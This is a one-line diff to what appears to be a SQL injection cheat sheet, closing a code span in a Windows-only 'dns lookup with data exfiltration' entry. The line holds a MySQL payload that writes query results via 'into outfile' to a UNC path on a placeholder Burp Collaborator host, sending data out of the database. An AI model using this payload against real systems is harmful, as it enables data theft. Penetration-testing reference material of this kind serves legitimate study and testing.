@@ -46,5 +46,5 @@ The following techniques work on Windows only.
 ## dns lookup with data exfiltration
 The following technique works on Windows only. 
 
-`select YOUR-QUERY-HERE into outfile '\\\\YOUR-COLLABORATOR.burpcollaborator.net\a' 
+`select YOUR-QUERY-HERE into outfile '\\\\YOUR-COLLABORATOR.burpcollaborator.net\a'` 
 
